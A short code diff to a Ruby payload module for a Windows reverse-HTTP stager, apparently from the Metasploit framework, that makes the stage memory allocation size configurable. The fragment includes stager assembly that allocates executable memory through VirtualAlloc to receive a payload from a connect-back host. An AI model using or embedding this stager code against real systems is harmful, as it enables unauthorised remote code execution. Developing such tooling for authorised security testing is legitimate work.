@@ -39,7 +39,8 @@ module Payload::Windows::ReverseHttp
       host:        ds['LHOST'] || '127.127.127.127',
       port:        ds['LPORT'],
       retry_count: ds['StagerRetryCount'],
-      retry_wait:  ds['StagerRetryWait']
+      retry_wait:  ds['StagerRetryWait'],
+      size:        ds['StagerStagePayloadSize'] || '0x400000'
     }
 
     # Add extra options if we have enough space
@@ -451,7 +452,7 @@ module Payload::Windows::ReverseHttp
     allocate_memory:
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
-      push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      push #{"0x%.8x" % opts[:size]} ; Stage allocation (4Mb ought to do us)
       push ebx               ; NULL as we dont care where the allocation is
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
@@ -515,4 +516,3 @@ module Payload::Windows::ReverseHttp
 end
 
 end
-
